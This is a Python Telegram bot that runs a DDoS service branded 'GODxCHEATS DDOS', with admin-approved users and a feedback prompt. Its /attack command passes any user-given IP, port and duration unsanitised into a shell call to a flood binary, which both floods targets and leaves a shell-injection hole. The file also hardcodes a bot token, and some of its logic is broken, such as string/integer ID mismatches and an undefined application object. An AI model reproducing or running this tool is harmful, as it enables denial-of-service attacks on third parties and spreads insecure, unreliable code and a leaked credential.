import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, Filters

TELEGRAM_BOT_TOKEN = '8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs'
ADMIN_USER_ID = 1662672529
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 WELCOME TO GODxCHEATS DDOS *\n"
        "*🔥 𝗢𝘄𝗻𝗲𝗿 @GODxAloneboy*\n"
        "*🔥 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 https://t.me/+sUHNz0xm_205MTBl*\n"    
        "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"                  
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @RAJOWNER90*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /manage add 12345678 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿 /manage rem 12345678 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @RAJOWNER90*\n*🔥 Channel https://t.me/+sUHNz0xm_205MTBl*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args
    
    if chat_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @RAJOWNER90*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /attack 127.0.0.1 80 10 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*", parse_mode='Markdown')
        return
    
    ip, port, time = args
    
    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is in progress.*", parse_mode='Markdown')
        return
    
    # First attack, let's run it
    await run_attack(chat_id, ip, port, time, context)
    await context.bot.send_message(chat_id=chat_id, text="*✅ Please send a photo of your last attack feedback*")
    
    # We'll use the context to store if the user has sent the feedback
    context.user_data['sent_feedback'] = False
    
    # Define the handler for the photo feedback
    async def handle_feedback_photo(update: Update, context: CallbackContext):
        if chat_id == update.effective_chat.id:
            if update.message.photo:
                await context.bot.send_message(chat_id=chat_id, text="*✅ Feedback received. You can now run another attack.*")
                context.user_data['sent_feedback'] = True
            else:
                await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please send a photo of your last attack feedback*")

    # Add the handler to the application
    application.add_handler(MessageHandler(Filters.photo, handle_feedback_photo))

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @RAJOWNER90*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /approve 12345678 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
        return

    target_user_id = args[0].strip()
    users.add(target_user_id)
    save_users(users)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @RAJOWNER90*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /remove 12345678 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
        return

    target_user_id = args[0].strip()
    users.discard(target_user_id)
    save_users(users)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Available Commands: 🔥*\n"
        "*✅ /start: Welcome message*\n"
        "*✅ /attack: Start a DDoS attack (requires permission)*\n"
        "*✅ /manage: Add or remove users (Admin only)*\n"
        "*✅ /approve: Approve a user to use the attack command (Admin only)*\n"
        "*✅ /remove: Remove a user's permission to use the attack command (Admin only)*\n"
        "*✅ /help: Show this help message*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("help", help))
    application.run_polling()

if __name__ == '__main__':
    main()
